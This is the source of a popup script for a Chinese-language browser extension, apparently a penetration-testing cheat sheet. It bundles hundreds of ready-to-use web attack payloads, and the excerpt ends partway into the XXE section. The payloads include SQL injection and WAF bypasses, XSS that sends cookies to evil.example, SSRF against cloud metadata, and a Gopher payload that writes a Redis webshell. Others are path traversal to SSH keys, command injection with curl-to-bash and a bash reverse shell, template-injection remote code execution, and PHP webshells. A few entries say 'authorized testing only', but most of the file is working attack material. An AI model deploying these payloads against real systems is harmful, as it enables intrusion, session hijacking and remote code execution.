/* ============================================================
 * Web安全Payload速查工具箱 - popup.js
 * 纯原生实现，无任何外部依赖与网络请求
 * 数据结构：id / cat / sub / desc / payload / builtin / fav
 * ============================================================ */
(function () {
  "use strict";

  /* ==================== 常量 ==================== */
  var STORAGE_KEY = "wpt_data_v1";
  var FAV_CAT = "我的收藏";
  var UNCATEGORIZED = "未分类";
  var NEW_CAT_VALUE = "__new__";

  var BUILTIN_CATEGORIES = [
    "SQL注入",
    "XSS跨站脚本",
    "SSRF服务端请求伪造",
    "目录穿越/路径遍历",
    "命令注入",
    "模板注入SSTI",
    "文件上传绕过",
    "XXE外部实体注入",
    "文件包含",
    "NoSQL注入",
    "其他注入",
    "权限绕过与信息泄露",
    "反序列化",
    "表达式注入"
  ];

  var CAT_KEYS = {
    "SQL注入": "sql",
    "XSS跨站脚本": "xss",
    "SSRF服务端请求伪造": "ssrf",
    "目录穿越/路径遍历": "path",
    "命令注入": "cmd",
    "模板注入SSTI": "ssti",
    "文件上传绕过": "upload",
    "XXE外部实体注入": "xxe",
    "文件包含": "lfi",
    "NoSQL注入": "nosql",
    "其他注入": "other",
    "权限绕过与信息泄露": "auth",
    "反序列化": "deser",
    "表达式注入": "expr"
  };

  var catSeq = {};

  /**
   * 生成一条内置Payload（id 按分类稳定递增，便于收藏记录长期有效）
   * @param {string} cat 分类
   * @param {string} sub 细分场景
   * @param {string} desc 场景说明
   * @param {string} payload Payload内容
   */
  function p(cat, sub, desc, payload) {
    catSeq[cat] = (catSeq[cat] || 0) + 1;
    return {
      id: "b-" + CAT_KEYS[cat] + "-" + catSeq[cat],
      cat: cat,
      sub: sub,
      desc: desc,
      payload: payload,
      builtin: true,
      fav: false
    };
  }

  /* ==================== 内置Payload数据（不可修改） ==================== */
  var BUILTIN_PAYLOADS = [

    /* ---------- 1. SQL注入 ---------- */
    p("SQL注入", "MySQL·联合查询", "MySQL 字符型注入点：用 UNION 探测回显列数（示例为3列）", "' UNION SELECT 1,2,3-- -"),
    p("SQL注入", "MySQL·联合查询", "MySQL 联合查询回显：读取当前库名、版本与数据库用户", "' UNION SELECT database(),version(),user()-- -"),
    p("SQL注入", "MySQL·联合查询", "MySQL 联合查询：拖取当前库全部表名（information_schema）", "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"),
    p("SQL注入", "MySQL·联合查询", "MySQL 联合查询：读取 users 表账号密码（按实际表名与列名调整）", "' UNION SELECT username,password,3 FROM users-- -"),
    p("SQL注入", "MySQL·报错注入", "MySQL 报错回显注入：extractvalue 读取版本，适用于无 UNION 回显点", "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -"),
    p("SQL注入", "MySQL·报错注入", "MySQL 报错回显注入：updatexml 读取当前库名", "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -"),
    p("SQL注入", "MySQL·报错注入", "MySQL 主键重复报错注入：适用于 extractvalue/updatexml 被过滤时", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    p("SQL注入", "MySQL·布尔盲注", "MySQL 布尔盲注：判断当前库名首字符是否为 s", "' AND SUBSTRING((SELECT database()),1,1)='s'-- -"),
    p("SQL注入", "MySQL·布尔盲注", "MySQL 布尔盲注：ASCII 逐位比较，页面正常即条件成立", "' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -"),
    p("SQL注入", "MySQL·时间盲注", "MySQL 时间盲注：IF+SLEEP，条件成立时延迟5秒", "' AND IF(SUBSTRING((SELECT database()),1,1)='s',SLEEP(5),0)-- -"),
    p("SQL注入", "MySQL·时间盲注", "MySQL 数字型注入点：最短 SLEEP 时间盲注验证", "1' AND SLEEP(5)#"),
    p("SQL注入", "MySQL·堆叠注入", "MySQL 堆叠注入：PDO 开启多语句时可执行建表语句", "';CREATE TABLE test_tmp(id INT);-- -"),
    p("SQL注入", "MySQL·堆叠注入", "MySQL 堆叠注入：用 SLEEP 验证多语句是否被数据库执行", "';SELECT SLEEP(5);-- -"),
    p("SQL注入", "MSSQL·联合查询", "MSSQL 注入点：UNION 逐步补 NULL 探测列数", "' UNION SELECT NULL,NULL,NULL-- -"),
    p("SQL注入", "MSSQL·报错注入", "MSSQL 报错回显：将 @@version 转 int 触发类型转换错误", "' AND 1=CONVERT(int,@@version)-- -"),
    p("SQL注入", "MSSQL·时间盲注", "MSSQL 时间盲注：WAITFOR DELAY 延时5秒验证注入", "';WAITFOR DELAY '0:0:5'-- -"),
    p("SQL注入", "MSSQL·堆叠注入", "MSSQL 堆叠注入：开启 xp_cmdshell 后执行系统命令（需 DBA 权限）", "';EXEC master..xp_cmdshell 'whoami'-- -"),
    p("SQL注入", "Oracle·联合查询", "Oracle 联合查询：读取 v$version 版本信息（需补全列数）", "' UNION SELECT banner,NULL FROM v$version-- -"),
    p("SQL注入", "Oracle·时间盲注", "Oracle 时间盲注：dbms_pipe.receive_message 延迟5秒", "' AND 1=dbms_pipe.receive_message(('a'),5)-- -"),
    p("SQL注入", "PostgreSQL·联合查询", "PostgreSQL 联合查询：读取当前库、版本与当前用户", "' UNION SELECT current_database(),version(),current_user-- -"),
    p("SQL注入", "PostgreSQL·时间盲注", "PostgreSQL 时间盲注：pg_sleep 延时5秒", "';SELECT pg_sleep(5)-- -"),
    p("SQL注入", "SQLite·联合查询", "SQLite 联合查询：读取版本与 sqlite_master 中的对象名", "' UNION SELECT sqlite_version(),group_concat(name),3 FROM sqlite_master-- -"),
    p("SQL注入", "宽字节注入", "GBK 编码站点：%df 吃掉反斜杠后闭合单引号（addslashes 绕过）", "%df' OR 1=1-- -"),
    p("SQL注入", "宽字节注入", "GBK 宽字节注入的 URL 编码形式，适用于 GET 参数", "%df%27%20OR%201=1--%20"),
    p("SQL注入", "WAF绕过", "MySQL 内联注释拆分 UNION/SELECT 关键字，绕过简单规则", "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -"),
    p("SQL注入", "WAF绕过", "大小写混写 + %0a 换行替代空格，绕过关键字与空格检测", "' UnIoN%0aSeLeCt 1,2,3-- -"),
    p("SQL注入", "WAF绕过", "用 && 替代 AND、%09 制表符替代空格，# 截断后续语句", "'%09&&%091=1%23"),


    /* ---------- 2. XSS跨站脚本 ---------- */
    p("XSS跨站脚本", "反射型·基础", "反射型XSS入门验证：最经典的 script 标签弹窗，适用于无过滤回显点", "<script>alert(1)</script>"),
    p("XSS跨站脚本", "反射型·基础", "反射型XSS：img onerror 事件弹窗，绕过 script 标签黑名单", "<img src=x onerror=alert(1)>"),
    p("XSS跨站脚本", "反射型·基础", "反射型XSS：svg onload 弹窗，适用于过滤 img/script 的场景", "<svg onload=alert(1)>"),
    p("XSS跨站脚本", "反射型·属性闭合", "属性闭合：双引号闭合后注入 script，适用于 href/value 等属性回显", "\"><script>alert(document.domain)</script>"),
    p("XSS跨站脚本", "反射型·属性闭合", "属性闭合：单引号闭合后注入 img 事件，适用于单引号包裹的属性", "'><img src=x onerror=alert(1)>"),
    p("XSS跨站脚本", "反射型·事件注入", "事件注入：body onload 自动触发，适用于可注入 body 标签的场景", "<body onload=alert(1)>"),
    p("XSS跨站脚本", "反射型·事件注入", "自动触发：autofocus + onfocus，无需用户点击", "<input autofocus onfocus=alert(1)>"),
    p("XSS跨站脚本", "反射型·事件注入", "自动触发：details ontoggle，绕过常见鼠标事件黑名单", "<details open ontoggle=alert(1)>"),
    p("XSS跨站脚本", "反射型·链接注入", "链接注入：javascript 伪协议，适用于 href 可控的 a 标签", "<a href=\"javascript:alert(1)\">click</a>"),
    p("XSS跨站脚本", "DOM型", "DOM型XSS：location.hash 可控时的测试向量，需前端直接写入 innerHTML", "#<img src=x onerror=alert(1)>"),
    p("XSS跨站脚本", "DOM型", "DOM型XSS：iframe srcdoc 写入点，内嵌脚本直接执行", "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"),
    p("XSS跨站脚本", "存储型·取Cookie", "存储型XSS：把 Cookie 外带到攻击者服务器（仅限授权测试）", "<script>new Image().src='//evil.example/?c='+encodeURIComponent(document.cookie)</script>"),
    p("XSS跨站脚本", "存储型·取Cookie", "存储型XSS：img onerror 外带 Cookie，绕过 script 标签限制", "<img src=x onerror=\"new Image().src='//evil.example/?c='+document.cookie\">"),
    p("XSS跨站脚本", "无弹窗XSS", "无弹窗XSS：静默外带页面地址与 Cookie，适用于隐蔽验证", "<img src=x onerror=\"fetch('//evil.example/?u='+btoa(location.href)+'&c='+btoa(document.cookie))\">"),
    p("XSS跨站脚本", "无弹窗XSS", "无弹窗XSS：静默跳转到钓鱼页面，验证点击/跳转类利用", "<img src=x onerror=\"location.href='//evil.example/phish'\">"),
    p("XSS跨站脚本", "SVG XSS", "SVG XSS：上传或内联 SVG 时执行 script，适用于头像/图片上传点", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"),
    p("XSS跨站脚本", "SVG XSS", "SVG XSS：onload 事件短 payload，适用于过滤 script 标签的场景", "<svg/onload=alert(1)>"),
    p("XSS跨站脚本", "WAF绕过·标签", "WAF绕过：嵌套 script 标签，绕过只替换一次的过滤器", "<scr<script>ipt>alert(1)</scr</script>ipt>"),
    p("XSS跨站脚本", "WAF绕过·编码", "WAF绕过：Base64+eval，绕过 alert/script 关键字检测", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
    p("XSS跨站脚本", "WAF绕过·关键字", "WAF绕过：拆分 alert 关键字并通过 window 动态调用", "<img src=x onerror=window['al'+'ert'](1)>"),
    p("XSS跨站脚本", "WAF绕过·编码", "WAF绕过：HTML 实体编码关键字，绕过简单字符黑名单", "<img src=x onerror=&#97;lert(1)>"),
    p("XSS跨站脚本", "WAF绕过·混淆", "WAF绕过：大小写与空格混淆事件名，绕过正则匹配", "<ImG sRc=x OnErRoR=alert(1)>"),
    p("XSS跨站脚本", "CSP绕过", "CSP绕过：meta refresh 跳转 javascript 伪协议（需允许内联脚本）", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"),
    p("XSS跨站脚本", "CSP绕过", "CSP绕过：利用站内 JSONP 回调执行脚本（需存在可控 callback）", "<script src=\"/api/jsonp?callback=alert(1)//\"></script>"),
    p("XSS跨站脚本", "CSP绕过", "CSP绕过：object data URI 加载 HTML（object-src 未限制时）", "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>"),
    p("XSS跨站脚本", "CSP绕过", "CSP绕过：base 标签劫持相对路径脚本（base-uri 未限制时）", "<base href=\"//evil.example/\">"),
    p("XSS跨站脚本", "XSS取Cookie", "XSS取Cookie：弹窗查看当前域 Cookie，快速验证会话是否可读", "<script>alert(document.cookie)</script>"),
    p("XSS跨站脚本", "XSS取Cookie", "XSS取Cookie：通过 document.location 外带 Cookie", "<script>document.location='//evil.example/?c='+document.cookie</script>"),


    /* ---------- 3. SSRF服务端请求伪造 ---------- */
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：访问本机 80 端口，适用于 URL 参数可控的请求", "http://127.0.0.1:80/"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：读取 Spring Boot Actuator 环境信息", "http://localhost:8080/actuator/env"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：访问 C 段网关地址，判断内网连通性", "http://192.168.1.1/"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：访问内网 Redis 端口，配合 Gopher 可进一步利用", "http://10.0.0.1:6379/"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：IPv6 回环地址，绕过仅限制 127.0.0.1 的规则", "http://[::1]:80/"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：访问未授权 Docker API，可进一步接管容器", "http://127.0.0.1:2375/version"),
    p("SSRF服务端请求伪造", "内网探测", "SSRF 内网探测：访问未授权 Elasticsearch，读取索引列表", "http://127.0.0.1:9200/_cat/indices"),
    p("SSRF服务端请求伪造", "本地文件读取", "SSRF 本地文件读取：file 协议读取 Linux 系统账号文件", "file:///etc/passwd"),
    p("SSRF服务端请求伪造", "本地文件读取", "SSRF 本地文件读取：file 协议读取 Windows 系统配置", "file:///c:/windows/win.ini"),
    p("SSRF服务端请求伪造", "云元数据·AWS", "AWS 云环境：访问实例元数据根路径（需 SSRF 可发请求）", "http://169.254.169.254/latest/meta-data/"),
    p("SSRF服务端请求伪造", "云元数据·AWS", "AWS 云环境：读取 IAM 临时凭证角色列表，进一步获取 AccessKey", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    p("SSRF服务端请求伪造", "云元数据·阿里云", "阿里云 ECS：访问 100.100.100.200 元数据服务", "http://100.100.100.200/latest/meta-data/"),
    p("SSRF服务端请求伪造", "云元数据·腾讯云", "腾讯云 CVM：访问 metadata.tencentyun.com 元数据服务", "http://metadata.tencentyun.com/latest/meta-data/"),
    p("SSRF服务端请求伪造", "Gopher·Redis", "Gopher 协议打 Redis：flushall 后写入 Webshell 并保存（需目标可出网）", "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0D%0A%0D%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"),
    p("SSRF服务端请求伪造", "Redis未授权", "Redis 未授权访问：使用 dict 协议读取服务信息", "dict://127.0.0.1:6379/info"),
    p("SSRF服务端请求伪造", "Gopher·HTTP", "Gopher 协议构造任意 HTTP 请求：访问内网 /admin 接口", "gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a"),
    p("SSRF服务端请求伪造", "IP进制绕过", "SSRF 绕过：十六进制 IP 表示 127.0.0.1，绕过字符串黑名单", "http://0x7f000001/"),
    p("SSRF服务端请求伪造", "IP进制绕过", "SSRF 绕过：十进制整数 IP 表示 127.0.0.1", "http://2130706433/"),
    p("SSRF服务端请求伪造", "IP简写绕过", "SSRF 绕过：省略段的短 IP 写法，等价于 127.0.0.1", "http://127.1/"),
    p("SSRF服务端请求伪造", "SSRF绕过·@", "SSRF 绕过：URL 中的 @ 让解析器访问 127.0.0.1，前面域名用于欺骗白名单", "http://expected.example@127.0.0.1/"),
    p("SSRF服务端请求伪造", "SSRF绕过·302", "SSRF 绕过：利用外部 302 跳转到内网地址（需可控跳转服务）", "http://evil.example/redirect?url=http://127.0.0.1/"),
    p("SSRF服务端请求伪造", "SSRF绕过·DNS", "SSRF 绕过：使用 nip.io 泛解析把任意 IP 包装成域名", "http://127.0.0.1.nip.io/"),
    p("SSRF服务端请求伪造", "SSRF绕过·八进制", "SSRF 绕过：八进制 IP 表示 127.0.0.1", "http://0177.0.0.1/"),

    /* ---------- 4. 目录穿越/路径遍历 ---------- */
    p("目录穿越/路径遍历", "Linux系统", "Linux 路径遍历：读取 /etc/passwd，最基础的穿越验证", "../../../../etc/passwd"),
    p("目录穿越/路径遍历", "Linux系统", "Linux 路径遍历：尝试读取 /etc/shadow（通常需要 root 权限）", "../../../../etc/shadow"),
    p("目录穿越/路径遍历", "Linux系统", "Linux 路径遍历：读取 /etc/hosts 判断内网主机映射", "../../../../etc/hosts"),
    p("目录穿越/路径遍历", "Linux系统", "Linux 路径遍历：读取 /proc/self/environ，可能泄露环境变量与密钥", "../../../../proc/self/environ"),
    p("目录穿越/路径遍历", "编码绕过", "路径遍历绕过：../ 使用 %2f 编码，绕过简单目录关键字过滤", "..%2f..%2f..%2fetc%2fpasswd"),
    p("目录穿越/路径遍历", "编码绕过", "路径遍历绕过：点与斜杠全部 URL 编码", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    p("目录穿越/路径遍历", "编码绕过", "路径遍历绕过：双重 URL 编码，适用于解码一次后仍过滤的场景", "..%252f..%252f..%252fetc%252fpasswd"),
    p("目录穿越/路径遍历", "双写绕过", "路径遍历绕过：....// 双写，过滤删除 ../ 后重新拼出 ../", "....//....//....//etc/passwd"),
    p("目录穿越/路径遍历", "Tomcat绕过", "Tomcat 路径绕过：使用 ..;/ 绕过基于路径归一化的权限校验", "..;/..;/..;/etc/passwd"),
    p("目录穿越/路径遍历", "Windows系统", "Windows 路径遍历：反斜杠形式读取 win.ini", "..\\..\\..\\windows\\win.ini"),
    p("目录穿越/路径遍历", "编码绕过", "Windows 路径遍历：反斜杠 URL 编码形式，绕过斜杠黑名单", "..%5c..%5c..%5cwindows%5cwin.ini"),
    p("目录穿越/路径遍历", "Unicode绕过", "路径遍历绕过：%c0%af 超长编码斜杠，适用于部分 Java 容器", "..%c0%af..%c0%af..%c0%afetc/passwd"),
    p("目录穿越/路径遍历", "00截断", "路径遍历+00截断：读取 /etc/passwd 并截断后续 .jpg 后缀", "/etc/passwd%00.jpg"),
    p("目录穿越/路径遍历", "00截断", "路径遍历+00截断：上传/下载接口中截断扩展名限制", "../../../../etc/passwd%00.png"),
    p("目录穿越/路径遍历", "Windows系统", "Windows 路径遍历：直接读取系统 hosts 文件", "C:\\Windows\\System32\\drivers\\etc\\hosts"),
    p("目录穿越/路径遍历", "敏感文件", "Java 应用敏感文件：读取 WEB-INF/web.xml 获取路由与配置", "/WEB-INF/web.xml"),
    p("目录穿越/路径遍历", "敏感文件", "Nginx 配置读取：获取站点根目录、反代与日志路径", "../../../../usr/local/nginx/conf/nginx.conf"),
    p("目录穿越/路径遍历", "敏感文件", "Nginx 日志读取：为日志包含 GetShell 做准备", "../../../../var/log/nginx/access.log"),
    p("目录穿越/路径遍历", "敏感文件", "Linux 敏感文件：读取 SSH 私钥（需文件权限允许）", "../../../../root/.ssh/id_rsa"),
    p("目录穿越/路径遍历", "编码绕过", "路径遍历绕过：混合编码点号与斜杠，绕过 WAF 规则", "%2e%2e/%2e%2e/%2e%2e/etc/passwd"),

    /* ---------- 5. 命令注入 ---------- */
    p("命令注入", "Linux·分隔符", "Linux 命令注入：分号分隔，执行 whoami 验证命令执行", "; whoami"),
    p("命令注入", "Linux·管道", "Linux 命令注入：管道符把前一条命令输出交给 whoami", "| whoami"),
    p("命令注入", "Linux·分隔符", "Linux 命令注入：|| 短路执行，前一条失败时执行 whoami", "|| whoami"),
    p("命令注入", "Linux·分隔符", "Linux 命令注入：&& 串联执行，前一条成功时执行 whoami", "&& whoami"),
    p("命令注入", "Linux·分隔符", "Linux 命令注入：& 后台执行，适用于不回显但可延时的场景", "& whoami"),
    p("命令注入", "Linux·替换", "Linux 命令注入：$() 命令替换，适用于双引号包裹的上下文", "$(whoami)"),
    p("命令注入", "Linux·替换", "Linux 命令注入：反引号命令替换，适用于无过滤的拼接点", "\x60whoami\x60"),
    p("命令注入", "Linux·换行", "Linux 命令注入：%0a 换行分隔，绕过只检测分号/管道的规则", "%0a whoami"),
    p("命令注入", "Linux·空格绕过", "Linux 命令注入：$IFS 替代空格执行 cat /etc/passwd", ";cat$IFS/etc/passwd"),
    p("命令注入", "Linux·空格绕过", "Linux 命令注入：\x24{IFS} 替代空格，适用于 $IFS 被部分过滤时", ";cat\x24{IFS}/etc/passwd"),
    p("命令注入", "Linux·空格绕过", "Linux 命令注入：重定向符 < 替代空格读取文件", ";cat</etc/passwd"),
    p("命令注入", "Linux·空格绕过", "Linux 命令注入：$IFS$9 拼接分隔，绕过简单空格过滤", ";cat$IFS$9/etc/passwd"),
    p("命令注入", "Linux·关键字绕过", "Linux 命令注入：单引号拆分关键字，绕过 whoami 黑名单", ";w'h'o'a'm'i"),
    p("命令注入", "Linux·关键字绕过", "Linux 命令注入：$@ 插入空字符拆分关键字", ";who$@ami"),
    p("命令注入", "Linux·编码绕过", "Linux 命令注入：Base64 编码命令后管道给 sh 执行", ";echo\x24{IFS}Y2F0IC9ldGMvcGFzc3dk|base64\x24{IFS}-d|sh"),
    p("命令注入", "Linux·远程下载", "Linux 命令注入：curl 下载远程脚本并直接执行（授权测试）", ";curl\x24{IFS}http://evil.example/x.sh|bash"),
    p("命令注入", "Linux·反弹Shell", "Linux 命令注入：bash 反弹 Shell 到攻击机 4444 端口（授权测试）", ";bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
    p("命令注入", "Windows·分隔符", "Windows 命令注入：& 分隔执行 whoami", "& whoami"),
    p("命令注入", "Windows·管道", "Windows 命令注入：| 管道执行 whoami", "| whoami"),
    p("命令注入", "Windows·cmd", "Windows 命令注入：显式调用 cmd /c 执行命令", "cmd /c whoami"),
    p("命令注入", "Windows·PowerShell", "Windows 命令注入：PowerShell 执行命令，适用于 cmd 被拦截时", "powershell -c \"whoami\""),
    p("命令注入", "Windows·变量", "Windows 命令注入：%COMSPEC% 调用命令解释器，绕过 cmd 关键字", "%COMSPEC% /c whoami"),
    p("命令注入", "Windows·下载", "Windows 命令注入：certutil 下载远程文件到本地（授权测试）", "certutil -urlcache -split -f http://evil.example/x.exe x.exe"),
    p("命令注入", "Windows·关键字绕过", "Windows 命令注入：^ 转义拆分关键字，绕过 whoami 黑名单", "who^ami"),
    p("命令注入", "无回显", "无回显命令注入：ping dnslog 子域名验证命令执行", ";ping -c 3 \x60whoami\x60.dnslog.example"),
    p("命令注入", "无回显", "无回显命令注入：nslookup 带出 whoami 结果到 DNSLog", ";nslookup \x60whoami\x60.dnslog.example"),
    p("命令注入", "无回显", "无回显命令注入：curl 请求 DNSLog 并携带命令结果", ";curl http://dnslog.example/\x60whoami\x60"),
    p("命令注入", "WAF绕过", "命令注入 WAF 绕过：反斜杠转义拆分 cat 关键字", ";ca\\t /etc/passwd"),
    p("命令注入", "WAF绕过", "命令注入 WAF 绕过：单引号拆分 cat 关键字", ";c'a't /etc/passwd"),


    /* ---------- 6. 模板注入SSTI ---------- */
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：最基础的表达式求值探测（7*7）", "{{7*7}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：读取 Flask config 中的密钥与数据库配置", "{{config}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：枚举 object 子类，寻找可执行命令的利用链", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：通过 cycler 全局函数调用 os.popen 执行 id", "{{cycler.__init__.__globals__.os.popen('id').read()}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：通过 lipsum 全局函数执行命令", "{{lipsum.__globals__['os'].popen('id').read()}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：通过 request.application 调用 os.popen 执行命令", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
    p("模板注入SSTI", "Jinja2·文件读取", "Jinja2 模板注入：利用 get_flashed_messages 内置函数读取 /etc/passwd", "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"),
    p("模板注入SSTI", "Jinja2·过滤绕过", "Jinja2 模板注入：拆分 __class__/__subclasses__ 关键字，绕过简单黑名单", "{{''['__clas''s__']['__mro__'][1]['__subclas''ses__']()}}"),
    p("模板注入SSTI", "Jinja2·RCE", "Jinja2 模板注入：遍历子类寻找 warning.catch_warnings 执行命令", "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：通过 url_for 全局函数执行命令", "{{url_for.__globals__['os'].popen('id').read()}}"),
    p("模板注入SSTI", "Jinja2", "Jinja2 模板注入：通过 self.__init__ 链读取内置模块并执行命令", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
    p("模板注入SSTI", "Thymeleaf", "Thymeleaf 模板注入：表达式预处理求值探测（7*7）", "[[\x24{7*7}]]"),
    p("模板注入SSTI", "Thymeleaf", "Thymeleaf 模板注入：通过 T() 调用 Runtime.exec 执行 id", "[[\x24{T(java.lang.Runtime).getRuntime().exec('id')}]]"),
    p("模板注入SSTI", "Thymeleaf", "Thymeleaf 预处理表达式：__\x24{...}__::.x 触发 SpEL 求值", "__\x24{T(java.lang.Runtime).getRuntime().exec('calc')}__::.x"),
    p("模板注入SSTI", "Thymeleaf·文件读取", "Thymeleaf 模板注入：Java NIO 读取 /etc/passwd", "[[\x24{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}]]"),
    p("模板注入SSTI", "Freemarker", "Freemarker 模板注入：实例化 Execute 工具类执行 id（经典 RCE）", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\x24{ex(\"id\")}"),
    p("模板注入SSTI", "Freemarker", "Freemarker 模板注入：直接 new Execute 并执行命令的短 payload", "\x24{\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
    p("模板注入SSTI", "Velocity", "Velocity 模板注入：通过 class.inspect 获取 Runtime 并执行命令", "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")"),
    p("模板注入SSTI", "Velocity", "Velocity 模板注入：反射构造 Runtime 并读取命令执行结果", "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$out.read()#end"),
    p("模板注入SSTI", "Smarty", "Smarty 模板注入：{php} 标签执行系统命令（仅旧版本/未禁用）", "{php}echo \x60id\x60;{/php}"),
    p("模板注入SSTI", "Smarty", "Smarty 模板注入：调用 writeFile 写入 PHP 文件（经典链）", "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php phpinfo(); ?>\",self::clearConfig())}"),
    p("模板注入SSTI", "Twig", "Twig 模板注入：注册 exec 为过滤器回调并执行命令（Twig 1.x）", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"),
    p("模板注入SSTI", "Twig", "Twig 模板注入：filter 过滤器调用 system 执行 id", "{{['id']|filter('system')}}"),
    p("模板注入SSTI", "Twig", "Twig 模板注入：sort 过滤器回调 system 执行 id", "{{['id',1]|sort('system')}}"),

    /* ---------- 7. 文件上传绕过 ---------- */
    p("文件上传绕过", "后缀名绕过", "Apache 双后缀解析：shell.php.jpg 在部分配置下按 PHP 解析", "shell.php.jpg"),
    p("文件上传绕过", "后缀名绕过", "Nginx/Apache 双后缀：shell.jpg.php 直接使用 PHP 后缀", "shell.jpg.php"),
    p("文件上传绕过", "后缀名绕过", "大小写绕过：shell.pHp 绕过区分大小写的黑名单", "shell.pHp"),
    p("文件上传绕过", "后缀名绕过", "PHP 替代后缀：shell.php5 适用于 Apache 配置 AddType php5", "shell.php5"),
    p("文件上传绕过", "后缀名绕过", "PHP 替代后缀：shell.phtml 适用于 Apache 解析 phtml", "shell.phtml"),
    p("文件上传绕过", "后缀名绕过", "Windows 尾点绕过：shell.php. 保存时可能被系统去掉末尾点", "shell.php."),
    p("文件上传绕过", "后缀名绕过", "空格绕过：shell.php%20 利用保存时去除末尾空格的逻辑", "shell.php%20"),
    p("文件上传绕过", "后缀名绕过", "NTFS ADS 绕过：shell.php::$DATA 在 Windows 下可能保留 php 解析", "shell.php::$DATA"),
    p("文件上传绕过", "解析漏洞", "IIS/Java 分号绕过：shell.jsp;.jpg 利用 ; 截断扩展名校验", "shell.jsp;.jpg"),
    p("文件上传绕过", "00截断", "00截断绕过：shell.jsp%00.jpg 截断后续 .jpg 后缀（旧版本环境）", "shell.jsp%00.jpg"),
    p("文件上传绕过", ".htaccess", "Apache .htaccess 上传：把 .jpg 强制按 PHP 解析", "AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png"),
    p("文件上传绕过", ".htaccess", "Apache .htaccess 上传：SetHandler 让所有文件交给 PHP 解析", "SetHandler application/x-httpd-php\nAddType application/x-httpd-php .jpg"),
    p("文件上传绕过", ".user.ini", "PHP-FPM .user.ini 上传：auto_prepend_file 在每个 PHP 文件前包含图片马", "auto_prepend_file=1.jpg"),
    p("文件上传绕过", ".user.ini", "PHP-FPM .user.ini 上传：auto_append_file 追加包含图片马", "auto_append_file=1.jpg"),
    p("文件上传绕过", "文件头绕过", "GIF 图片马：保留 GIF89a 文件头并附加一句话木马，绕过文件头检测", "GIF89a;<?php @eval($_POST['cmd']);?>"),
    p("文件上传绕过", "内容检测绕过", "PHP 一句话木马：配合图片头或 .user.ini 使用", "<?php @eval($_POST['cmd']);?>"),
    p("文件上传绕过", "内容检测绕过", "PHP 命令执行木马：通过 GET 参数执行系统命令", "<?php system($_GET['cmd']);?>"),
    p("文件上传绕过", "SVG XSS", "SVG 头像上传：内嵌 onload 事件触发 XSS，适用于允许 SVG 的场景", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>"),
    p("文件上传绕过", "Content-Type", "Content-Type 绕过：伪造 image/jpeg 请求头并携带 PHP 代码", "Content-Type: image/jpeg\n\n<?php system($_GET['cmd']);?>"),

    /* ---------- 8. XXE外部实体注入 ---------- */
    p("XXE外部实体注入", "XXE读文件", "XXE 读取本地文件：Linux /etc/passwd，最基础的文件读取", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
